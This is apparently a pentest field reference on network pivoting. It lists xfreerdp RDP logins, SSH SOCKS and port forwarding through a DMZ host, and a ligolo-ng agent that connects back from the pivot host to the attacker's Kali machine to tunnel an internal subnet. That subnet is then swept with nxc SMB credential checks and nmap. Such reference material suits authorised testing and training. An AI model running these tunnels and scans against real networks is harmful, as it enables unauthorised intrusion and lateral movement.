## Commands

**Kali**

```bash
xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD'
# Share a local folder with the RDP session

```

Some Kali installs name the client xfreerdp3. Use the installed launcher; verify the server certificate.

<Accordion title="1. SSH port forwarding (no tools needed)">

### 1. SSH port forwarding (no tools needed)

**Pivoting and File Transfer: Field Reference**

```bash
# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
ssh -D 1080 jbetty@<DMZ_IP>
#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
proxychains nxc smb 172.16.119.11 -u user -p pass

# Local (-L): map ONE internal service to a Kali local port (great for RDP)
ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains

# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
```

</Accordion>

### 3. ligolo‑ng (transparent TUN — best for RDP/scanning)

**Pivoting and File Transfer: Field Reference**

```bash
# Kali — one-time interface setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Kali — start the proxy (listens on 11601)
sudo ./proxy -selfcert
# pivot host — run the agent (upload it first)
./agent -connect <KALI_IP>:11601 -ignore-cert
# Kali — in the ligolo console:
session            # pick the agent
start              # activate the tunnel
# Kali — route the internal subnet through ligolo
sudo ip route add 172.16.119.0/24 dev ligolo
# now everything just works:
nxc smb 172.16.119.11 -u user -p pass
xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
nmap -sT 172.16.119.0/24
```
